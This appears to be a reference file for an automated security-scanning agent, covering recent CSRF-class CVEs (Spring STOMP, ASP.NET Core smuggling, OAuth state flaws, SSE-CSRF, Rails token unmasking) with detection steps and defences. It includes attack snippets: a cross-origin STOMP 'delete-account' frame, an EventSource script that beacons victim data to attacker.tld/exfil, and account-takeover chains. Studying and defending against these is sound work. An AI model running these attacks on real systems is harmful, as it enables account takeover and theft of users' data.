---
name: csrf-novel-deep
description: CSRF at the 2024–2026 frontier — Spring STOMP CSRF (CVE-2025-41254), ASP.NET Core AntiForgery bypass via smuggling (CVE-2025-55315 twofer), OAuth CSRF RFC 9700 shift with fastapi-users/HedgeDoc CVE cluster, SSE-CSRF class with Algernon anchor (CVE-2026-46431), Rails protect_from_forgery OTP-XOR class, and Fetch Metadata middleware deployment maturity.
sibling: csrf
load_when: scan_mode == "deep"
---

# CSRF — Novel + Frontier Depth

This is the novel+frontier deep sibling to `csrf.md`. The base owns the class framing, SameSite basics (including the Lax+POST 2-minute window), CSWSH introduction, Fetch Metadata defense mechanics, double-submit bypass classes, PoC-template gallery, chaining routes, and the frontier-CVE routing map. The advanced+expert sibling `csrf_advanced_deep.md` owns sub-resource CSRF, JSON-endpoint CSRF depth, CSWSH against hardened targets, CORS-relaxed CSRF, OAuth flow abuse depth, SameSite defense-depth, and composite-chain construction. This file owns the 2024–2026 CVE frontier and current-frontier framing — CVE mechanism decomposition with canonical version tables, emerging technique classes (SSE-CSRF, Rails OTP-XOR), the RFC 9700 shift, Fetch Metadata deployment status, and regression patterns.

Load this file when the goal is matching a target against a current CVE family or reasoning about CSRF-shape defects in modern stacks (STOMP/WebSocket, ASP.NET Core smuggling-triggered antiforgery bypass, OAuth 2.0 clients, SSE consumers, Rails apps with OTP-XOR technique exposure) that share the class shape without necessarily having a specific advisory.

Every CVE number, version boundary, GHSA identifier, and patch-mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-7-*/cve-json/` and `.../ghsa-json/`. Where a repo-scoped GHSA (not in the global GHSA DB) is referenced, that fact is stated explicitly.

## Spring Framework STOMP CSRF — CVE-2025-41254

Primitive: attacker-controlled STOMP messages sent over an authenticated Spring WebSocket session cause CSRF-shape state changes at the STOMP endpoint, without any CSRF token or Origin check at the STOMP layer.

**Root cause — CSRF protection missing at the STOMP frame layer.** Spring's `spring-websocket` module supports STOMP as a subprotocol over WebSocket. The standard Spring Security CSRF filter operates at the HTTP layer and does not inspect STOMP frames. When an authenticated WebSocket session is established, subsequent STOMP frames sent over that session are processed without CSRF validation. An attacker who can induce a victim's browser to open a WebSocket connection to the target (either via CSWSH — the base's Origin-check-missing case — or via a legitimate connection followed by attacker-induced STOMP message injection) can then send STOMP SEND frames that execute state-changing actions.

**Affected version table** (canonical for this trio; single-owner per §2):

| Line | Affected range | OSS fix | Enterprise-Support-only backport |
|---|---|---|---|
| 6.2.x | 6.2.0 – <6.2.12 | 6.2.12 | — |
| 6.1.x | 6.1.0 – 6.1.23 | (no OSS fix) | (possibly ES-only; verify) |
| 6.0.x | 6.0.0 – 6.0.29 | (no OSS fix in OSS GHSA) | (possibly ES-only) |
| 5.3.x | ≤ 5.3.45 | (no OSS fix in OSS GHSA) | (possibly ES-only) |

Version-boundary source: `.zen-batch-artifacts/batch-7-*/cve-json/CVE-2025-41254.nvd.json` and `.../ghsa-json/GHSA-7fch-4f2f-jcgm.json`. NVD `vulnStatus=Deferred` (no CPE ranges in NVD JSON); the OSS version scope is confirmed via GHSA. Spring's own advisory documents the older-branch backports as Enterprise-Support-only — do NOT describe as generally available in OSS. Same pattern as CVE-2024-38819 from Batch 6.

**Preconditions as an exploitation gate:**

1. Spring version is inside one of the affected ranges above.
2. The target uses Spring WebSocket with STOMP as a subprotocol (`WebSocketMessageBrokerConfigurer` in the app).
3. The application has state-changing STOMP message handlers (`@MessageMapping` methods that mutate state).
4. Attacker can induce the victim's browser to establish an authenticated WebSocket session to the target (which requires either CSWSH — WebSocket handshake without Origin check — or a legitimate WebSocket session the attacker's page can hook into via XSS or a prior redirect).

**Confirmation methodology:**

1. Fingerprint Spring version and STOMP endpoint (typically `/ws`, `/stomp`, or a custom path).
2. From an attacker-controlled origin, open a WebSocket connection to the STOMP endpoint (test CSWSH first — is Origin check missing?).
3. Send a STOMP SEND frame targeting a state-change message handler.
4. Verify the state change through an out-of-band read.

**Escalation:**

- Depends entirely on what the STOMP message handlers do. Common patterns:
  - Chat message injection (impersonate users).
  - Trading action injection (if the target has trading via STOMP).
  - Notification-broadcast injection.
  - Admin-action injection if the STOMP endpoint permits admin messages.

**Class-generalization — the pattern that predicts the next bug:**

Any web-messaging protocol layered over an authenticated session (STOMP, MQTT-over-WebSocket, XMPP, Socket.IO custom events) that doesn't apply the framework's CSRF middleware at the messaging layer is a candidate for the same class. Grep target codebases for `@MessageMapping` (Spring), `@subscribe` (Socket.IO), MQTT topic handlers — any of these accepting state-change messages without CSRF validation is exposed.

**Post-fix regression watch:**

- Spring may reintroduce the class in future Spring WebSocket revisions if the CSRF-at-message-layer defense is not made default. Monitor for CVEs in `spring-websocket` and `spring-messaging`.

**Detailed attack construction:**

For a Spring app with STOMP over WebSocket:

1. Attacker-hosted page includes a WebSocket client using STOMP:
   ```javascript
   const socket = new SockJS('https://target/ws');
   const stompClient = Stomp.over(socket);
   stompClient.connect({}, () => {
     // Session established with victim's cookies (CSWSH prerequisite)
     stompClient.send('/app/state-change', {}, JSON.stringify({
       action: 'delete-account',
       userId: 'victim-id'
     }));
   });
   ```

2. If the target's `/ws` handshake accepts cross-origin (missing Origin allowlist), the WebSocket opens with victim's cookies.

3. STOMP CONNECT frame sent; server accepts.

4. STOMP SEND frame to `/app/state-change` executes without CSRF token.

**Alternate delivery — via XSS on the target:**

If XSS is present anywhere on the target domain, the attacker's XSS can perform the STOMP CSRF from within the target origin — no CSWSH needed. This is a stronger primitive because same-origin WebSocket handshakes bypass Origin checks entirely.

**Compensating controls:**

- Apply Spring Security CSRF filter to STOMP endpoints (`configureInbound()` in `WebSocketMessageBrokerConfigurer`).
- Enforce Origin allowlist on WebSocket handshake (built into Spring but disabled by default in some templates).
- Rate-limit STOMP messages per session.
- Use HttpOnly + SameSite=Strict for session cookies to reduce CSWSH surface.

**Historical Spring CSRF CVE lineage:**

Spring Security CSRF filter has had multiple CVEs across its history:
- CVE-2016-5007 — CSRF token race condition.
- CVE-2018-15801 — SAML SSO CSRF variant.
- CVE-2025-41254 — STOMP CSRF (current).

Each recurrence is a specific class instance; the underlying class (CSRF middleware coverage gap) is durable.

## ASP.NET Core AntiForgery Bypass — CVE-2025-55315

**Twofer with `http_request_smuggling_novel_deep.md § ASP.NET Core Smuggling — CVE-2025-55315`.** The primary technical mechanism (HTTP request smuggling at the Kestrel parser layer) is owned in the smuggling novel sibling; this section covers the CSRF-specific impact framing.

Primitive: an HTTP request smuggling class in ASP.NET Core Kestrel allows bypassing the built-in AntiForgery middleware. The smuggled request appears (from the middleware's perspective) to be part of a preceding authenticated request that already passed AntiForgery validation; the smuggled request performs state changes without a valid AntiForgery token.

**Version and mechanism:**

For the full version table and mechanism dissection, see `http_request_smuggling_novel_deep.md § ASP.NET Core Smuggling — CVE-2025-55315`. The relevant highlights for the CSRF framing:

- CVSS 9.9, highest-severity ASP.NET Core CVE in the smuggling class.
- The AntiForgery middleware trusts connection-level state that smuggling bypasses.
- The chain is: smuggling → connection-state trust exploit → AntiForgery bypass → state change.

**CSRF-specific detection methodology:**

1. Fingerprint the ASP.NET Core version and confirm the AntiForgery middleware is present.
2. Confirm the smuggling class (see smuggling sibling for the class-specific probe).
3. Craft a smuggled request that targets an AntiForgery-protected endpoint.
4. Observe whether the endpoint accepts the request without a valid token.

**Impact framing for the CSRF class:**

- Any state change protected by AntiForgery is exploitable via the smuggling primitive.
- Account settings, password changes, MFA disables, financial transactions — all reachable if the middleware bypass works.
- The impact is proportional to the state-change endpoints available.

**Class-generalization:**

Any CSRF middleware that trusts connection-level state (rather than per-request re-validation) is a candidate for the class when paired with a smuggling primitive. Django, Rails, Spring Security may have equivalent chains if smuggling is possible against them.

**Detailed exploitation:**

The chain construction requires:

1. **Fingerprint the ASP.NET Core version** — response headers, error page shape, JS bundle references.
2. **Fingerprint the smuggling class present** — Kestrel-specific probes (see smuggling novel sibling).
3. **Identify a target state-change endpoint** — `/account/change-email`, `/account/change-password`, `/api/admin/*`.
4. **Construct the smuggled request** — the smuggling primitive delivers the malicious request such that the middleware treats it as continuation of an authenticated session.
5. **Verify state change** — out-of-band read of the target's state after the smuggling.

**Compensating controls before patch:**

- Deploy a WAF that rejects malformed HTTP requests (many WAFs have post-disclosure signatures).
- Add per-request AntiForgery re-validation at the app layer (verify the token on every handler, not middleware).
- Front Kestrel with a strict-parsing reverse proxy (IIS, Nginx, HAProxy).
- Disable HTTP keepalive (breaks smuggling by forcing new connections; performance impact).

**Chain into complete account takeover:**

The most severe chain: attacker bypasses AntiForgery via smuggling, changes victim's password via `/account/change-password`, logs in as victim, exports/exfiltrates victim's data or performs financial actions. CVSS 9.9 reflects this complete-takeover chain.

**Downstream impact classes:**

- **Password/email change** → full account takeover.
- **MFA disable** → password-only takeover trivial.
- **Session termination** → forced re-authentication, potential DoS.
- **API key regeneration** → attacker-controlled API access.
- **Financial actions** → direct financial impact.

**Cross-CVE chaining:**

CVE-2025-55315 chains with any other application-layer vulnerability that a smuggled request can reach. If the target has an admin endpoint with a separate auth vulnerability, the smuggling chain amplifies both.

## OAuth CSRF — RFC 9700 State/PKCE Shift

RFC 9700 (published Jan 2025) upgraded the OAuth 2.0 state parameter and PKCE from SHOULD to MUST. Every OAuth 2.0 client not implementing both is out of spec after RFC 9700. Multiple 2024–2026 CVEs exemplify the class.

**RFC 9700 requirements:**

- **state parameter MUST be present** — random, unguessable, bound to the session.
- **PKCE code_challenge/code_verifier MUST be used** for public clients.
- **state MUST be validated** on the callback — mismatch or absence must fail the flow.

**CVE cluster:**

**CVE-2025-68481 (fastapi-users):**
- fastapi-users < 15.0.2 vulnerable; 15.0.2 fixed.
- Class: OAuth state token had no random claim; state JWT valid ~1 hour and reusable across victims.
- GHSA-5j53-63w8-8625.

**CVE-2025-66629 (HedgeDoc):**
- HedgeDoc < 1.10.4 vulnerable; 1.10.4 fixed.
- Class: missing OAuth2 `state` parameter entirely.
- GHSA-6wm6-3vpq-6qvv (**repo-scoped only** — not in the global GHSA DB; advisory HTML persisted at `.zen-batch-artifacts/batch-7-*/ghsa-json/GHSA-6wm6-3vpq-6qvv.html`).

**Attack chain for the class:**

1. Attacker identifies OAuth-protected endpoint (`/oauth/callback`).
2. Attacker crafts a URL that starts an OAuth flow with attacker-controlled client parameters.
3. Because state validation is missing or weak, the flow can be replayed against multiple victims or hijacked.
4. Impact: account linking to attacker-controlled provider identity, or OAuth code hijack for tokens.

**Detection:**

- Identify OAuth authorize/callback endpoints.
- Test whether state is required (send request without state — does the flow fail?).
- Test whether state is validated (send request with random state — does the flow accept it?).
- Test whether state is bound to session (send state from another session — is it accepted?).

**Class-generalization:**

Any OAuth 2.0 client not enforcing RFC 9700's MUST requirements is a candidate. The list of implementations is large — most SaaS apps integrate OAuth with third-party providers; each integration is a potential class instance.

**Detailed attack construction — CVE-2025-68481 (fastapi-users):**

fastapi-users library provides OAuth2 client integration for FastAPI. Pre-15.0.2, the state token was a JWT with no random `nonce` claim; the JWT was valid for 1 hour and reusable across victims. Attack:

1. Attacker starts an OAuth flow with the target's fastapi-users; obtains a valid state JWT.
2. Attacker distributes the state JWT via phishing / CSRF PoC.
3. Victim initiates OAuth flow; attacker's state JWT is accepted as valid.
4. Attacker captures the OAuth authorization code; exchanges for access token.
5. Access token grants access to victim's identity.

Fix in 15.0.2 adds a random `nonce` claim bound to the specific request, preventing cross-victim reuse.

**Detailed attack construction — CVE-2025-66629 (HedgeDoc):**

HedgeDoc's OAuth2 flow prior to 1.10.4 omitted the `state` parameter entirely. Attack:

1. Attacker crafts a CSRF PoC that starts an OAuth flow.
2. Victim's browser initiates the flow.
3. No state validation on callback; attacker's crafted flow is accepted.
4. Impact: attacker's OAuth provider account can be linked to victim's HedgeDoc account.

Fix in 1.10.4 adds mandatory state parameter with per-session binding.

**OAuth CSRF chain into cross-app takeover:**

If the OAuth CSRF chain succeeds, the attacker may be able to:
1. Bind their OAuth provider identity to the victim's app account.
2. Log in to the app using their own provider credentials.
3. Access the victim's app data, act as the victim.
4. If the app has other OAuth integrations (e.g., "connect your Stripe account"), attacker may extend the chain to other services.

**Compensating controls:**

- Enforce RFC 9700 MUST requirements: state (random, per-session, validated) + PKCE (code_challenge + code_verifier).
- Server-side session-binding of state parameter, not just client-side.
- Short state TTL (< 5 minutes).
- Nonce rotation on failed callbacks (don't reuse state after mismatch).

## SSE (EventSource) CSRF Class

Primitive: Server-Sent Events (SSE) use CORS "simple request" semantics — no preflight, credentials attached by default when `withCredentials: true`, auto-reconnect replays credentials on every reconnection. An SSE endpoint returning user-specific data with permissive CORS (`Access-Control-Allow-Origin: *` combined with credentials) is a live cross-origin credentialed read primitive.

**Class shape:**

- SSE endpoint at `/api/updates` returns real-time user-specific data.
- Endpoint sets `Access-Control-Allow-Origin: *`.
- Endpoint honors cookies for authentication.
- Attacker-hosted page opens `new EventSource("https://target/api/updates")` — credentials attached.
- Attacker reads the SSE stream cross-origin.

**Anchor CVE — CVE-2026-46431 (Algernon):**

- Algernon (Go web framework) ≤1.17.6 vulnerable; 1.17.7 fixed.
- Class: SSE endpoint hardcoded `Access-Control-Allow-Origin: *` in the auto-refresh code path.
- GHSA-hw27-4v2q-5qff.
- Version-boundary source: `.zen-batch-artifacts/batch-7-*/cve-json/CVE-2026-46431.nvd.json` and `.../ghsa-json/GHSA-hw27-4v2q-5qff.json`.

**Attack chain:**

1. Identify SSE endpoints (`/events`, `/updates`, `/sse`, `/api/stream`).
2. Check CORS headers on the SSE response (`ACAO: *` + credentials-forwarding is the vulnerable shape).
3. From an attacker-hosted page: `const es = new EventSource("https://target/api/updates", {withCredentials: true});`.
4. `es.onmessage = e => exfil(e.data);` — read the SSE stream.

**Class-generalization:**

The pattern extends to any streaming endpoint with permissive CORS and cookie-based authentication:
- SSE (documented above).
- Long-polling endpoints returning streaming JSON.
- Chunked HTTP responses with data streams.

**Fetch Metadata as a defense:**

- SSE requests set `Sec-Fetch-Mode: cors` and specific `Sec-Fetch-Dest: empty`.
- Server-side check on `Sec-Fetch-Site: cross-site` would reject cross-origin SSE.
- But most current SSE endpoints don't implement Fetch Metadata checks (community-tier deployment, see next section).

**Detailed exploitation:**

1. Enumerate SSE endpoints via source review or endpoint fingerprinting (`text/event-stream` Content-Type on responses).
2. Test the endpoint's CORS behavior: send with `Origin: https://attacker.tld`.
3. If ACAO is `*` or reflects attacker's origin, and credentials are supported, proceed.
4. Craft attacker page:
   ```javascript
   const es = new EventSource("https://target/api/updates", { withCredentials: true });
   es.onmessage = e => {
     // Real-time data from victim's session
     navigator.sendBeacon("https://attacker.tld/exfil", e.data);
   };
   ```
5. Victim visits attacker page; SSE stream open with victim's cookies; attacker exfiltrates data.

**Impact classes:**

- **Chat/notification exfiltration** — real-time messages pushed to the victim's SSE stream (Slack-style, in-app notifications).
- **Session-token exfiltration** — some apps push session tokens or refresh tokens over SSE for real-time auth.
- **Real-time API data** — market data, order updates, alerts.
- **Presence-tracking exfiltration** — other users' activity data pushed to the victim.

**Detection depth:**

- Any SSE endpoint with `text/event-stream` Content-Type is a candidate.
- Any endpoint with `Cache-Control: no-cache` and streaming JSON is a candidate.
- Test each with cross-origin `Origin` header; check for CORS-permissive response.

**Related class expressions:**

- **Long-polling endpoints** — return streaming JSON with credentials; if CORS-permissive, same class.
- **HTTP-chunked responses** with data streams — similar shape.
- **WebSocket-alternative technologies** (SockJS fallback, Long Polling) — inherit the underlying stream's CORS posture.

**Compensating controls:**

- Explicit CORS allowlist on SSE endpoints (no `*` with credentials).
- Fetch Metadata check on SSE (reject `Sec-Fetch-Site: cross-site` for user-scoped SSE).
- Move to WebSocket with proper Origin allowlist (WebSocket handshake has stronger cross-origin controls).
- Ensure SSE endpoints don't return user-identifying data cross-origin.

## Rails `protect_from_forgery` OTP-XOR Class

Primitive: Rails' default CSRF protection (`protect_from_forgery`) uses a one-time-pad-XOR (OTP-XOR) pattern where the CSRF token stored in the session is XORed with a per-request OTP; the ciphertext + OTP are Base64-encoded and sent as the request token. An attacker who obtains a valid ciphertext + OTP can decode the raw token by Base64-decoding, extracting the OTP, and XORing to recover the raw token. Once recovered, the attacker can re-encrypt the raw token with a different OTP and generate arbitrary valid CSRF tokens for the target session.

**Class shape (no CVE — framework-wide technique disclosure):**

- Reported publicly in 2025 (across security-vendor writeups).
- Affects all current Rails versions using `protect_from_forgery` with the default token-generation logic.
- No CVE assigned — the framework's own advisory-position is that this is behavior-as-designed given the trust model.

**Attack chain:**

1. Attacker obtains a valid CSRF token for a target session (via XSS, session capture, or another leak).
2. Attacker Base64-decodes the token; format is `<OTP-bytes><ciphertext-bytes>`.
3. Attacker XORs OTP with ciphertext to recover the raw token.
4. Attacker generates new tokens by XORing the raw token with different OTPs.
5. Each generated token is valid for the same session.

**Impact:**

- If an attacker can obtain one valid token (e.g., via XSS reading a form's hidden token field), they can generate any number of valid tokens for that session.
- The double-submit-cookie defense (token in cookie + body) is unaffected by this class because the attacker doesn't have the cookie value — but many Rails apps use session-based tokens.

**Class-generalization:**

Any CSRF token scheme that reveals internal token state through the wire format is a candidate. HMAC-based tokens with per-request nonces are less exposed if the HMAC key isn't reversible.

**Mitigation:**

- Use HMAC-signed CSRF tokens instead of OTP-XOR.
- Bind CSRF tokens to specific endpoints and methods.
- Rotate the session's CSRF secret on privilege change.

**Detailed technique disclosure:**

Rails' token format (post-Rails 5.2 with per-form token):

```
Base64(OTP || (raw_token XOR OTP))
```

Where:
- OTP is a random 32-byte string per token generation.
- `raw_token` is the session-bound CSRF token.
- The XOR provides one-time-pad encryption of the raw token per request.

Attack recovery:

1. Base64-decode the token to get OTP + ciphertext.
2. XOR OTP with ciphertext to recover raw_token.
3. Generate new OTP; XOR with raw_token; concatenate; Base64-encode.
4. The new token is valid for the same session.

**Rails' response to the disclosure:**

The Rails security team's position (per their public statements) is that this is behavior-as-designed: if an attacker has one valid token, they have equivalent access to a would-be XSS reading the session cookie directly. The double-submit-cookie defense mitigates this at the framework level; the raw-session-token pattern is preserved for backward compatibility.

**Chain expressions:**

- XSS on the target → attacker reads one CSRF token → attacker generates arbitrary tokens for the session.
- Alternate: attacker steals CSRF token via network sniff on an HTTP endpoint (if the target has any HTTP-not-HTTPS state-change endpoint) → generates arbitrary tokens.
- Alternate: attacker phishes a legitimate CSRF token via a supply-chain compromised dependency.

**Framework alternative comparison:**

- **Django's CSRF middleware** uses HMAC with a per-session key; not OTP-XOR. Less exposed to this class.
- **Spring Security's default `HttpSessionCsrfTokenRepository`** uses a per-session UUID; not OTP-XOR.
- **ASP.NET Core's AntiForgery** uses AES with a rotating key; more robust than Rails' OTP-XOR.

Rails' OTP-XOR is the specific class instance; other frameworks are less exposed.

## Fetch Metadata Middleware — 2024–2026 Deployment Status

Fetch Metadata (`Sec-Fetch-*` headers) is a browser-set defense mechanism that servers can inspect to reject cross-site requests. As of 2024–2026, deployment maturity is uneven — no major web framework ships Fetch Metadata middleware as default.

**Framework status (verified per CSRF research fork):**

- **Django** — [ticket #31823](https://code.djangoproject.com/ticket/31823) proposed adding Fetch Metadata middleware; not landed in Django core as of the batch cutoff. Community package: `django-modern-csrf`.
- **Spring Security** — [issue #18361](https://github.com/spring-projects/spring-security/issues/18361) is an opt-in-only proposal; not shipped as default.
- **Express (Node)** — no built-in Fetch Metadata; community package: `fetch-metadata` (npm).
- **Laravel (PHP)** — no built-in; community package: `laravel-fetch-metadata`.
- **ASP.NET Core** — no built-in Fetch Metadata middleware; developers implement manually.
- **Ruby on Rails** — no built-in.
- **FastAPI / Starlette** — no built-in; community `fetch-metadata-asgi` exists.

**Deployment maturity implication:**

Any claim that "the target uses Fetch Metadata for CSRF protection" must state the middleware source — framework-default vs community-tier. Most deployments as of 2024–2026 either don't use Fetch Metadata at all, or use it as an additional layer alongside traditional tokens.

**Detection:**

- Check response headers on the target for signs of Fetch Metadata usage — some apps set `Vary: Sec-Fetch-Site` when they act on it.
- Send requests with different `Sec-Fetch-Site` values and observe response differences.
- Grep the target's server-side code for `Sec-Fetch-Site` header inspection.

**Bypass classes when Fetch Metadata is deployed:**

- Coverage gaps — middleware applied via decorator/annotation may miss some routes.
- Fail-open on missing headers — server accepts requests without `Sec-Fetch-*` (e.g., from curl, older browsers, non-browser clients).
- Same-site sibling — `Sec-Fetch-Site: same-site` (which a subdomain satisfies) may be trusted incorrectly.
- Top-level GET with `Sec-Fetch-Site: none` — user-initiated navigation to a state-change GET endpoint arrives as `none`, not `cross-site`.

**Community-tier package survey:**

- **Django `django-modern-csrf`** — implements Fetch Metadata + traditional CSRF token; opt-in via `INSTALLED_APPS`. Community-maintained; audit dependency freshness.
- **`fetch-metadata` (npm)** — Express middleware; opt-in; small footprint.
- **`fetch-metadata-asgi`** — ASGI middleware for FastAPI/Starlette; opt-in.
- **`laravel-fetch-metadata`** — Laravel middleware; opt-in.
- **Spring Security's proposal** (Issue #18361) — not merged; when it lands, will be opt-in initially, then likely default in Spring Security 7+.

**Migration guidance for defenders:**

For teams adopting Fetch Metadata:
1. Enable in report-only mode first (log rejections without acting on them).
2. Analyze rejected requests for legitimate patterns (mobile app callbacks, older browsers, non-browser API clients).
3. Add allowlists for legitimate non-cross-site requests.
4. Enable enforcement after 2-4 weeks of report-only analysis.
5. Retain token-based CSRF defense as defense-in-depth.

**Fingerprinting Fetch Metadata deployment:**

If the target is using Fetch Metadata, the response may include:
- `Vary: Sec-Fetch-Site` header on some responses.
- Distinct error responses for `Sec-Fetch-Site: cross-site` vs missing header.
- Rejection responses citing "cross-origin request denied" or similar.

Test by sending state-change requests with varying `Sec-Fetch-Site` values and observing.

## SameSite Lax-Default Status

Chrome's SameSite=Lax-by-default has been the stable default since Feb 2020. As of 2024–2026:

- No policy regression by Chrome.
- Firefox and Safari have similar defaults with slight variations.
- Edge follows Chrome.
- `LegacySameSiteCookieBehaviorEnabledForDomainList` expired ~Jan 2025 (Chrome enterprise policy that allowed legacy behavior for specific domains).

**Implication:**

- Session cookies without an explicit `SameSite` attribute default to Lax on modern Chrome.
- The Lax+POST 2-minute window (base file's discussion) applies specifically to defaulted-Lax cookies; explicit-Lax cookies don't have this window.
- Cross-browser matrix testing remains important — old browsers (< 2020 Chrome, older Firefox/Safari) don't enforce Lax by default.

**Non-browser clients:**

- Curl, wget, server-side fetchers, mobile apps with cookie jars — all ignore SameSite.
- Any target whose defense relies solely on SameSite is bypassable from these clients (though not from a browser CSRF).

## Regression Patterns for CSRF

The four core regression patterns from `path_traversal_lfi_rfi_novel_deep.md § Modern Regression Patterns` apply to CSRF:

**Check-then-refactor decay for CSRF:**

Rails' `protect_from_forgery` middleware was hardened; API-mode Rails (`ActionController::API`) was later added with the middleware disabled by default. The "hardened default" invariant decayed for API-mode.

**Hardened default with opt-in reopening:**

`@csrf_exempt` in Django, `.csrf().disable()` in Spring Security, `[IgnoreAntiforgeryToken]` in ASP.NET Core — each is an opt-in that reopens the class per-route. Audit for over-broad usage.

**Constrained parser with unconstrained pre-processor:**

CVE-2025-55315 is the archetype: ASP.NET Core AntiForgery is the constrained parser (per-endpoint validation), Kestrel smuggling is the unconstrained pre-processor that bypasses it.

**Two parsers on one wire:**

Chunked-transfer parsers accepting different content-types differently; a request with `Content-Type: text/plain` and JSON body may be parsed one way by the CSRF middleware, differently by the app.

**Sanitizer applied post-serialization:**

A CSRF middleware that normalizes a request before validation, followed by an app that receives the raw pre-normalization request, is a candidate for the class (specific to certain architectures).

**Pattern-specific prevention checklists:**

- Every CSRF middleware exemption requires justification and audit.
- Every non-HTTP CSRF surface (WebSocket, STOMP, MQTT, Socket.IO) needs its own CSRF defense.
- Every OAuth 2.0 client MUST implement state and PKCE (RFC 9700).
- Every SSE endpoint returning user data MUST enforce cross-origin policy.
- Cookie SameSite attribute should be explicit (Strict or Lax), never defaulted.

## CSRF Chaining at the Current Frontier

The batch-7 CSRF CVEs chain into specific downstream impacts:

**Spring STOMP CSRF (CVE-2025-41254) chain:**

1. Attacker page or CSWSH opens authenticated WebSocket to Spring target.
2. STOMP SEND frame sent over the session; state-change handler executes.
3. Impact: whatever the STOMP handler does — chat impersonation, trading, admin actions.

**ASP.NET Core AntiForgery bypass (CVE-2025-55315) chain:**

1. Smuggling primitive established (see smuggling novel sibling).
2. Smuggled request bypasses AntiForgery middleware.
3. State change under victim's session — password change, MFA disable, account transfer.
4. Impact: full account takeover for high-value state changes.

**OAuth CSRF cluster (CVE-2025-68481, CVE-2025-66629) chain:**

1. Missing/weak state validation in OAuth client.
2. Attacker forces victim through OAuth flow with attacker-chosen provider account.
3. Victim's session gets bound to attacker's identity, or attacker captures victim's OAuth code.
4. Impact: account linking / takeover; depending on the provider, cross-account access.

**SSE-CSRF (CVE-2026-46431) chain:**

1. SSE endpoint returns user-specific data cross-origin.
2. Attacker page reads the stream.
3. Extracted data: real-time notifications, session tokens pushed over stream, user activity.
4. Impact: information disclosure at scale.

**Rails OTP-XOR chain:**

1. Attacker obtains one valid CSRF token (via XSS or session leak).
2. Attacker generates arbitrary tokens for the same session.
3. Impact: CSRF-token-required actions become forge-able if the attacker has the initial leak.

## Composite Chains — 2024–2026 Frontier

**Chain 1 — Spring STOMP CSRF → chat impersonation → phishing internal to victim's team:**

1. Target: Spring Boot enterprise chat app using STOMP over WebSocket. Version 6.2.10 (in CVE-2025-41254 range).
2. Attacker's page hosted at `attacker.tld`. Victim visits.
3. Attacker's JS opens `wss://target/ws` — CSWSH succeeds (Origin check absent on WebSocket handshake).
4. STOMP CONNECT + SEND frame to `/app/chat/send` with attacker-crafted message impersonating victim to another team member.
5. Target user receives the phishing message from "victim" — social engineering succeeds because the message is signed by victim's identity.
6. Chain: Spring STOMP CSRF (this file) → impersonation (framework-owned) → phishing (downstream, outside skill scope).

**Chain 2 — ASP.NET Core smuggling → antiforgery bypass → account takeover:**

1. Target: ASP.NET Core 8.0.15 app with Antiforgery middleware.
2. Attacker probes smuggling class (per `http_request_smuggling_novel_deep.md § ASP.NET Core Smuggling — CVE-2025-55315`); confirms.
3. Attacker smuggles a POST to `/account/change-password` with new password field.
4. Antiforgery bypassed; password changed.
5. Attacker logs in as victim with new password.
6. Chain: smuggling → antiforgery bypass → account takeover.

**Chain 3 — OAuth CSRF (fastapi-users) → account linking → cross-app takeover:**

1. Target: SaaS platform using fastapi-users < 15.0.2 for OAuth.
2. Attacker obtains a valid state JWT by starting their own OAuth flow.
3. Attacker crafts phishing link: `https://target/oauth/callback?state=<attacker-JWT>&code=<attacker-provider-code>`.
4. Victim clicks; target's OAuth callback accepts the state JWT; links attacker's provider identity to victim's app account.
5. Attacker now logs in via their own provider credentials; accesses victim's app data.
6. If the app has other OAuth integrations, attacker chains to those.
7. Chain: OAuth CSRF (this file) → identity linking → cross-app takeover.

**Chain 4 — SSE-CSRF → notification-token exfil → API-key access:**

1. Target: real-time notification platform (Algernon-based, or any SSE with permissive CORS).
2. SSE endpoint at `/notifications/stream` returns real-time notifications including API-key-rotation-notification with the new key inline.
3. Attacker's page opens SSE stream cross-origin.
4. Attacker reads notifications including API-key rotation events.
5. Attacker uses the new API key for downstream API access.
6. Chain: SSE-CSRF (this file) → API-key exfil → API access.

**Chain 5 — Rails OTP-XOR + XSS → token forgery → sustained CSRF:**

1. Target: Rails app with `protect_from_forgery`. XSS present on a review-comments page.
2. Attacker's XSS reads a valid CSRF token from a form field.
3. Attacker's XSS decodes the token via OTP-XOR to recover the raw session token.
4. Attacker generates new tokens with different OTPs; each is valid for the session.
5. Sustained CSRF: attacker performs state changes over an extended session window with forged tokens.
6. Chain: XSS (`xss.md`) → OTP-XOR technique class → sustained CSRF.

## Post-Fix Detection

**Per-CVE fingerprint hierarchy:**

- **CVE-2025-41254 (Spring STOMP)** — check Spring Framework version; test STOMP endpoint for CSRF protection at message layer.
- **CVE-2025-55315 (ASP.NET Core)** — check ASP.NET Core version; smuggling-class probe.
- **CVE-2025-68481 (fastapi-users)** — check fastapi-users version; test OAuth state validation.
- **CVE-2025-66629 (HedgeDoc)** — check HedgeDoc version; test OAuth state validation.
- **CVE-2026-46431 (Algernon)** — check Algernon version; test SSE endpoint CORS headers.

**Concrete probe scripts (authorization required):**

```bash
# Spring STOMP CSRF probe
# Fingerprint Spring version, then test STOMP endpoint
spring_ver=$(curl -s "https://target/whitelabel-error" | grep -oE 'Spring[^ ]*/[0-9.]+' | head -1)
echo "Spring: ${spring_ver:-unknown}"

# STOMP endpoint discovery
curl -sI "https://target/ws" | grep -i upgrade
# If Upgrade: websocket, STOMP endpoint present.

# OAuth state validation test
# Send an OAuth authorize request without state parameter; observe rejection
curl -X GET "https://target/oauth/authorize?client_id=test&response_type=code&redirect_uri=http://localhost/"
# If accepts (no state error), missing state validation confirmed.

# SSE CSRF test
# Check CORS headers on SSE endpoint
curl -sI "https://target/api/updates" -H "Origin: https://evil.tld" | grep -iE 'access-control-allow'
# ACAO: * + credentials-forwarding = CSRF-live.
```

## OAuth Provider-Specific CSRF Surface

Beyond the generic OAuth CSRF class, specific providers have specific implementation quirks:

**Google OAuth:**
- Enforces state parameter presence but doesn't validate the client's state-vs-session binding server-side (client is responsible).
- PKCE required for public clients since 2023.
- `include_granted_scopes=true` can extend attacker access if chained.

**GitHub OAuth:**
- State parameter recommended; PKCE optional (as of the batch cutoff).
- Personal Access Token creation via OAuth callback is a high-value chain target.
- Fine-grained tokens introduced 2022 — more scoped than classic PATs.

**Microsoft (Azure AD, Entra ID):**
- Strict state enforcement in current versions.
- ID token binding via `nonce` claim.
- Cross-tenant token issues (if attacker registers a tenant with the same name pattern) are a related class.

**Auth0:**
- Universal Login flow enforces state.
- Older callback flow variants have had CSRF-adjacent CVEs.

**Okta:**
- Strict OIDC compliance.
- Custom apps may misconfigure the callback URL, opening CSRF surface.

